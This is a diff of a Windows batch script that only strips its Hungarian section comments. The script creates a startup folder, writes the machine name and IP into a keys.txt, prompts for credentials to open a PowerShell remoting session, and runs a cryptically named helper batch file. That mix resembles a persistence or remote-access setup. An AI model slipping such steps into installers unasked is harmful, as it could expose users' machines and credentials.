@@ -1,11 +1,9 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: ====== MAPPÁK ======
 set "TARGET=%PUBLIC%\Documents\keys"
 if not exist "%TARGET%" mkdir "%TARGET%"
 
-:: Keys.txt létrehozása, ha még nincs
 if not exist "%TARGET%\keys.txt" (
     echo Created by installer > "%TARGET%\keys.txt"
 )
@@ -17,8 +15,6 @@ if not exist "%STARTUP_FOLDER%" (
     mkdir "%STARTUP_FOLDER%"
 )
 
-
-:: ====== GÉPNÉV + IP ======
 set "GEPNEV=%COMPUTERNAME%"
 
 for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
@@ -26,8 +22,6 @@ for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
     set "IP=!TEMPIP: =!"
 )
 
-
-:: ====== KEYS.TXT FELÜLÍRÁSA ======
 (
     echo GEPNEV: !GEPNEV!
     echo IP: !IP!
@@ -37,8 +31,6 @@ echo [INFO] keys.txt frissítve.
 echo [INFO] PowerShell Remoting indítása: %IP%
 echo.
 
-
-:: ====== POWERSHELL REMOTING (JAVÍTVA) ======
 powershell.exe -Command "
     $IP = '%IP%';
     $user = Get-Credential;
@@ -46,8 +38,6 @@ powershell.exe -Command "
     Enter-PSSession -ComputerName $IP -Credential $user
 "
 
-
-:: ====== EXCLUDE.BAZ FUTTATÁSA ======
 echo.
 echo [INFO] exclude.baz futtatása...
 
@@ -60,3 +50,4 @@ if exist "%~dp0excfb6sfb3.bat" (
 
 echo.
 pause
+
